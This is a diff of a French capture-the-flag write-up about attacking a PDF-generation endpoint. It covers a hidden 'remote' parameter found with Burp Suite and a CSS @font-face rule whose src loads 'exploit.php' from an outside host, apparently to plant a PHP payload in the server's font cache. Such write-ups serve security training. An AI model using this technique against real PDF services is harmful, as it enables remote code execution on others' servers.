@@ -452,8 +452,8 @@ La fonction réalise une requête vers :
 ```
 generate_pdf.php?remote
 ```
-Ce paramètre n’est renseigné nulle part ailleurs dans l’application.  
-Il s’agit donc très probablement d’un mécanisme interne utilisé par les développeurs. De plus, le commentaire indique clairement que cette fonction n'aurait pas dû être présente dans l’environnement de production. Cela suggère que la requête POST pour créer un PDF peut avoir un autre type de sortie lorsqu’elle est executé avec le paramètre `remote`.
+
+Il s’agit très probablement d’un mécanisme interne utilisé par les développeurs. De plus, le commentaire indique clairement que cette fonction n'aurait pas dû être présente dans l’environnement de production. Cela suggère que la requête POST pour créer un PDF peut avoir un autre type de sortie lorsqu’elle est executé avec le paramètre `remote`.
 J'intercepte donc avec burpsuite la requête POST et ajoute le paramètre remote:
 ![[IMG-20251206140425794.png]]
 On observe une différence dans la réponse. En effet, un nouveau Header est présent: 
@@ -494,7 +494,7 @@ C’est suffisant pour que le fichier soit téléchargé puis mis en cache côt�
 ```css
 @font-face {
     font-family: 'exploit';
-    src: url('https://theoctf.pythonanywhere.com/static/test4.php');
+    src: url('https://theoctf.pythonanywhere.com/static/exploit.php');
     font-weight: normal;
     font-style: normal;
 }
